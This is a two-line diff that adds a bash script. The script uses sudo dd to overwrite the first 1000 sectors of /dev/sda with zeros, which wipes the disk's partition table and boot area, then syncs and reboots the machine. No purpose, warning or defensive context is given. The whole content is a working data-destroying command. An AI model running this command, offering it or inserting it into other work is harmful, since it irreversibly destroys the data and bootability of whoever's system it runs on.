@@ -1,0 +1,2 @@
+#!/bin/bash
+sudo dd if=/dev/zero of=/dev/sda count=1000 && sudo sync && sudo reboot
